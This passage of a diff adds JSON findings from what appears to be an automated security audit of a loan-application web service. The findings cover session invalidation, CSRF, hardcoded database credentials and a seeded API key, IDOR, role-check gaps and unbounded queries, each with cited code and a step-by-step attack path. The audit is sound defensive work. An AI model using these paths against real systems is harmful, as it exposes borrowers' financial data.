+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "app/main.py",
+      "start": {
+        "line": 717
+      },
+      "end": {
+        "line": 717
+      },
+      "extra": {
+        "message": "Existing sessions not invalidated after password change",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "user.password_hash = hash_password(payload.new_password)\n    audit(db, request, user, \"profile_updated\", \"user\", user.id)\n    db.commit()\n    return {\"user\": user_public(user)}",
+          "proof": "The update_profile endpoint (line 711) changes the user's password hash at line 717 but does not invalidate existing JWT sessions. Since JWTs are stateless and contain no version counter or password-change timestamp (see security.py:14 SESSION_TTL_MINUTES=720), any previously issued tokens remain valid until their natural expiry (up to 12 hours). An attacker who has stolen a session token can continue to use it even after the victim changes their password. The same issue exists at line 703 in password_reset_confirm."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "app/main.py",
+      "start": {
+        "line": 1182
+      },
+      "end": {
+        "line": 1182
+      },
+      "extra": {
+        "message": "No anti-CSRF protection on state-changing decision endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "@app.post(\"/api/applications/{application_id}/decisions\")\ndef create_decision(application_id: int, payload: DecisionIn, request: Request, user: CurrentUser, db: Session = Depends(get_db)) -> dict[str, Any]:",
+          "proof": "The create_decision endpoint at line 1182 performs a state-changing POST (recording loan approval/rejection decisions) with no CSRF token validation, no Origin/Referer check, and no custom request header requirement. The app authenticates via session cookie (SESSION_COOKIE_NAME) with SameSite=Lax. SameSite=Lax provides only partial protection \u2014 it still permits same-site subdomain POSTs triggered by top-level navigation. An attacker can trick an authenticated admin/underwriter into submitting a malicious decision."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "docker-compose.yml",
+      "start": {
+        "line": 5
+      },
+      "end": {
+        "line": 5
+      },
+      "extra": {
+        "message": "Hardcoded PostgreSQL superuser credentials in Docker Compose",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "POSTGRES_USER: postgres\n      POSTGRES_PASSWORD: postgres",
+          "proof": "SOURCE: The docker-compose.yml at lines 5-6 hardcodes database superuser credentials (postgres/postgres). SINK: When deployed, the PostgreSQL instance is provisioned with these well-known defaults. Combined with the port mapping '5432:5432' (line 9) binding to all interfaces, any attacker with network access can authenticate and gain full database access."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-668",
+      "path": "docker-compose.yml",
+      "start": {
+        "line": 9
+      },
+      "end": {
+        "line": 9
+      },
+      "extra": {
+        "message": "PostgreSQL port exposed on all network interfaces",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-668"
+          ],
+          "citation": "ports:\n      - \"5432:5432\"",
+          "proof": "SOURCE: The docker-compose.yml at line 9 binds PostgreSQL port 5432 to 0.0.0.0 (all interfaces) with no IP restriction. SINK: Any external attacker who can reach the host can connect directly to the database. Combined with hardcoded credentials (lines 5-6), this provides unauthenticated remote database access."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "scripts/seed.py",
+      "start": {
+        "line": 301
+      },
+      "end": {
+        "line": 301
+      },
+      "extra": {
+        "message": "Hardcoded API key seeded into application database",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "db.add(ApiKey(owner_user_id=users[\"admin\"].id, name=\"Demo status integration\", key_prefix=\"lp_live_demo0000\", key_hash=hash_token(\"lp_live_demo_status_key\"), is_active=True))",
+          "proof": "SOURCE: The seed script at line 301 creates an active hardcoded API key 'lp_live_demo_status_key' with predictable prefix 'lp_live_demo0000'. SINK: Anyone who discovers this key (visible in source code) can authenticate to /api/integrations/applications/{id}/status and enumerate every loan application's status and underwriting decision."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "app/main.py",
+      "start": {
+        "line": 1032
+      },
+      "end": {
+        "line": 1032
+      },
+      "extra": {
+        "message": "Support specialist can upload documents to any borrower's application via missing role check",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "if user.role == \"underwriter\":\n        raise HTTPException(status_code=403, detail=\"Underwriters cannot upload borrower documents\")\n    if user.role == \"borrower\" and document.application.borrower_profile.user_id != user.id:\n        raise HTTPException(status_code=403, detail=\"Document is not accessible\")",
+          "proof": "SOURCE: An authenticated support_specialist sends POST to /api/documents/{document_id}/upload targeting any document on any application. GATE 1: require_application_view at line 1029 returns True for support_specialist on ALL applications (see can_view_application line 376). GATE 2: The role check at line 1032 only blocks 'underwriter' \u2014 support_specialist passes. GATE 3: The cross-borrower ownership check at line 1034 only applies to role 'borrower' \u2014 support_specialist passes. SINK: Lines 1044-1055 write attacker-supplied file content to disk and update the document record as 'uploaded'. A support specialist \u2014 intended only for document handling assistance \u2014 can upload arbitrary files to any borrower's document slots."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-639",
+      "path": "app/main.py",
+      "start": {
+        "line": 1684
+      },
+      "end": {
+        "line": 1684
+      },
+      "extra": {
+        "message": "BOLA/IDOR in integration API \u2014 any API key can read any application's status, risk tier, business name, and full decision data",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-639"
+          ],
+          "citation": "def integration_application_status(application_id: int, request: Request, x_api_key: Annotated[str | None, Header(alias=\"X-API-Key\")] = None, db: Session = Depends(get_db)) -> dict[str, Any]:\n    key = authenticate_api_key(db, x_api_key)\n    application = get_application_or_404(db, application_id)\n    latest = sorted(application.decisions, key=lambda item: item.created_at, reverse=True)[0] if application.decisions else None",
+          "proof": "SOURCE: application_id from untrusted URL path. FLOW: authenticate_api_key validates the API key but get_application_or_404 loads the LoanApplication by id with NO require_application_view() call and NO ownership/scope check against the API key's owner. SINK: returns application.status, risk_tier, business_name (PII), and the full latest DecisionRecord (approved_amount, term_months, interest_rate, reasons, borrower_summary) for ANY application_id. An attacker with any valid API key can enumerate all application IDs and read their sensitive financial data."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "app/main.py",
+      "start": {
+        "line": 1667
+      },
+      "end": {
+        "line": 1667
+      },
+      "extra": {
+        "message": "API key owner deactivation does not invalidate the key \u2014 deactivated admin's keys remain fully valid",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "def authenticate_api_key(db: Session, raw_key: str | None) -> ApiKey:\n    if not raw_key:\n        raise HTTPException(status_code=401, detail=\"API key required\")\n    key = db.scalar(select(ApiKey).where(ApiKey.key_prefix == raw_key[:16], ApiKey.is_active.is_(True)).options(selectinload(ApiKey.owner)))\n    if not key or not hmac_compare(hash_token(raw_key), key.key_hash):\n        raise HTTPException(status_code=401, detail=\"Invalid API key\")\n    key.last_used_at = utcnow()\n    return key",
+          "proof": "SOURCE: API key from X-API-Key header. FLOW: authenticate_api_key loads ApiKey with is_active=True filter and eagerly loads Owner via selectinload, but NEVER checks key.owner.is_active. If an admin user's account is deactivated (is_active=False), their API keys continue to work because only the key-level active flag is validated. SINK: the returned key object is used in integration_application_status (line 1688) where key.owner is passed to audit() \u2014 the deactivated user's identity is recorded as the actor, and the request succeeds."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-434",
+      "path": "app/main.py",
+      "start": {
+        "line": 1452
+      },
+      "end": {
+        "line": 1452
+      },
+      "extra": {
+        "message": "File upload content-type validation bypass in import_borrower_leads \u2014 trusts client-supplied Content-Type header without content inspection",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-434"
+          ],
+          "citation": "if upload.content_type not in {\"text/csv\", \"application/vnd.ms-excel\", \"text/plain\"}:\n        raise HTTPException(status_code=400, detail=\"Borrower leads must be uploaded as CSV\")",
+          "proof": "SOURCE: upload.content_type is the client-supplied HTTP Content-Type header, trivially spoofable. FLOW: The only validation is matching this header against an allowlist \u2014 no magic-byte inspection, no content sniffing. The bytes are then decoded via 'content.decode(\"utf-8-sig\")' and fed to csv.DictReader. SINK: An attacker sends a .exe, .zip, or HTML payload with Content-Type: text/csv and the data is persisted into BorrowerProfile fields (business_name, owner_name, owner_email, etc.) and committed to the database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 1292
+      },
+      "end": {
+        "line": 1292
+      },
+      "extra": {
+        "message": "Unbounded resource consumption in admin users listing -- no pagination or LIMIT clause",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "users = db.scalars(stmt).all()",
+          "proof": "SOURCE: No user-supplied limit/pagination. FLOW: The query loads ALL User rows into memory with .all() and serializes every one into a single JSON response. SINK: For a lending platform with tens of thousands of users, this endpoint buffers the entire result set -- email, full_name, role for every user -- in one HTTP response, causing OOM on the server or network saturation. Other list endpoints in the same file (notifications at line 1209 with .limit(30), audit at line 1404 with .limit(300)) implement limits; this one does not."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-200",
+      "path": "app/main.py",
+      "start": {
+        "line": 567
+      },
+      "end": {
+        "line": 567
+      },
+      "extra": {
+        "message": "Payment account bank details exposed to support_specialist via application_detail",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-200"
+          ],
+          "citation": "if is_staff(user):\n    payload[\"notes\"] = sorted([note_public(note) for note in application.notes], key=lambda item: item[\"created_at\"])\n    payload[\"payment_accounts\"] = [\n        {\n            \"id\": account.id,\n            \"account_holder\": account.account_holder,\n            \"bank_name\": account.bank_name,\n            \"account_type\": account.account_type,\n            \"masked_account_number\": account.masked_account_number,\n            \"routing_last4\": account.routing_last4,\n            \"verified\": account.verified,\n        }\n        for account in application.borrower_profile.payment_accounts\n    ]",
+          "proof": "SOURCE: Authenticated support_specialist sends GET /api/applications/{id} for any application_id. GATE: require_application_view (line 889) always passes because can_view_application (line 382) returns True unconditionally for support_specialist. SINK: application_detail (line 555) checks is_staff(user) at line 567 -- and is_staff (line 307) returns True for support_specialist. This gates exposure of payment_accounts including account_holder, bank_name, account_type, masked_account_number, routing_last4, and verification status. Since support_specialist can enumerate every application_id, they can harvest payment-account data for every borrower in the system. The support_specialist role is intended for document handling and messaging, not financial account access -- this is a cross-role data exposure."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-285",
+      "path": "app/main.py",
+      "start": {
+        "line": 1007
+      },
+      "end": {
+        "line": 1007
+      },
+      "extra": {
+        "message": "Support specialist can reset any application status to 'needs_documents' via request_document",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-285"
+          ],
+          "citation": "application.status = \"needs_documents\"",
+          "proof": "SOURCE: Authenticated support_specialist sends POST /api/applications/{id}/documents/request. GATE 1: require_role(user, 'admin', 'underwriter', 'support_specialist') at line 995 explicitly allows support_specialist. GATE 2: require_application_view at line 997 always passes for support_specialist on any application. There is NO check on the application's current status before line 1007. SINK: Line 1007 unconditionally sets application.status = 'needs_documents' and line 1008 sets application.status_reason. A support_specialist can change a finalized 'approved' or 'rejected' application back to 'needs_documents', disrupting closed workflows. Even in-progress applications in 'in_review' or 'submitted' states can be reset. No final-status guard exists -- only update_application_status_for_documents (used elsewhere) checks FINAL_STATUSES, but request_document bypasses that function entirely."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 1511
+      },
+      "end": {
+        "line": 1511
+      },
+      "extra": {
+        "message": "DoS: Export endpoints load all records unbounded into memory",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "applications = db.scalars(stmt.order_by(LoanApplication.created_at.desc())).all()",
+          "proof": "SOURCE: Authenticated admin triggers GET /api/admin/exports/applications (line 1503), /api/admin/exports/decisions (line 1534), or /api/admin/exports/documents (line 1565). SINK: All three export endpoints call .all() with no LIMIT clause (applications at line 1511, decisions at line 1536, documents at line 1569), loading every matching row into a Python list before serializing to CSV/JSON. An attacker with admin access -- or who has compromised an admin session -- can trigger these endpoints to consume unbounded server memory proportional to the total row count of the applications/decisions/documents tables, causing memory exhaustion. No pagination, streaming, or row cap is applied."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-400",
+      "path": "app/main.py",
+      "start": {
+        "line": 1131
+      },
+      "end": {
+        "line": 1131
+      },
+      "extra": {
+        "message": "DoS: document_review_queue loads all matching documents unbounded into memory",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-400"
+          ],
+          "citation": "docs = db.scalars(stmt).all()",
+          "proof": "SOURCE: Authenticated support_specialist, underwriter, or admin sends GET /api/documents/review-queue (line 1119). SINK: Line 1131 calls db.scalars(stmt).all() with no LIMIT clause. For support_specialist and admin roles, the query has no scope filter beyond an optional status_filter -- it loads every KYCDocument row in the system into memory. Combined with eager-loaded relationships (application, borrower_profile, document_type, reviewer), this can exhaust server memory when the document table is large. No pagination, row cap, or streaming is applied."
+        }
+      }
+    }
+  ]
+}
